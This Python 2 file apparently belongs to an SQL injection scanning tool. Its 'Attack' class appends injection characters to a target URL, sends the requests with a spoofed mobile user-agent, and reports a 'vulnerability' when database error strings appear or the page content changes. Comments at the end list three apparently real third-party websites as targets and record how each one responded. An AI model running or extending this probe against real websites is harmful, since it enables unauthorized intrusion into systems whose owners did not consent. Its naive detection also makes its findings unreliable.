# -*- coding: utf-8 -*-
try:
    import src.libs as lib
    from src.Colors import TextColor
    from injection_defines import *
except Exception as err:
    raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s"%(err)) + TextColor.WHITE

define_data = {"user-agent":"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) " + \
                            "AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"}

class Attack(object):
    def __init__(self, url):
        self.url = url

        self.__TestVulnarability__()

    def __TestVulnarability__(self):
        global define_data
        print

        firstResponse = lib.requests.get(url=self.url, params=define_data)

        for item in define_injections_chars:
            lib.sys.stdout.write(TextColor.CYAN + str('[%s]'%(self.url + str(item))) + TextColor.WHITE)
            resposne = lib.requests.get(url=self.url + str(item), params=define_data)
            lib.sleep(.5)
            if resposne.content.find(define_error_list[0]) is not -1 \
                    or resposne.content.find(define_error_list[1]) is not -1 \
                    or resposne.content.find(define_error_list[2]) is not -1 \
                    or resposne.content.find(define_error_list[3]) is not -1:
                print TextColor.RED + " => find vulnrability"
            elif resposne.content != firstResponse.content:
                print TextColor.RED + " => find vulnrability"
            else:
                print TextColor.GREEN + " => clear"

#todo: this script must recognize the kindof database that target used
#todo: target = http://tncgroup.pk/content.php?Id=2 => show error
#todo: target = http://tesc.ir/index.php?ctrl=static_page&lang=1&id=4232 => forbidden
#todo: target = http://webnevisan.ir/index.php?type=project-detail&id=123 => change its content



